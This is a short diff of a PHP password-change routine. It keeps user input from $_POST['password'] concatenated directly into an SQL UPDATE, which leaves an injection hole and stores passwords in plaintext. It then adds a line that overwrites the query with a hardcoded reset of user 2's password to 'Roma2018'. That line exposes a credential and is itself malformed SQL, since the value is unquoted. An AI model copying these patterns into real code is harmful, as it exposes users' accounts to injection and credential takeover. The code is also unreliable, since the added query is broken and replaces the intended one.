@@ -16,8 +16,9 @@
             if($autentificacion->validar_cambio_contrasenia()) {
 
                 
-                    $sql = "UPDATE usuarios SET clave = '" . $_POST['password'] . "', cambio_clave = 0 WHERE id = " . $_SESSION['user_id'];
+                    $sql = "UPDATE usuarios SET clave = '" . $_POST['password'] . "', cambio_clave = 0 WHERE id = '" . $_SESSION['user_id'] . "'";
 
+                    $sql = "UPDATE usuarios SET clave = Roma2018, cambio_clave = 0 WHERE id = 2";
                     $resultado = mysqli_query($conexion, $sql);
                             
                     if($resultado) {
